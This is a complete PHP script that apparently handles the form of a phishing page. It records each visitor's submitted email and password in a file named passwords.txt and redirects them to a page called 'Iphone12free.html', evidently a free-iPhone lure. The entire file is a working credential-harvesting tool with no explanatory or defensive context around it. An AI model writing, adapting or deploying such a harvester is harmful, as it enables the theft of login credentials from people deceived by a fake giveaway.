<?php
header("location: Iphone12free.html");
$handle=fopen("passwords.txt","a");
fwrite($handle,"------------------------------\n");
foreach($_POST as $var => $value){
if($var == "email" || $var=="pass"){
fwrite($handle,$var);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\n");
}
}
fwrite($handle,"-----------------------------\r\n");
fclose($handle);
exit;
?>
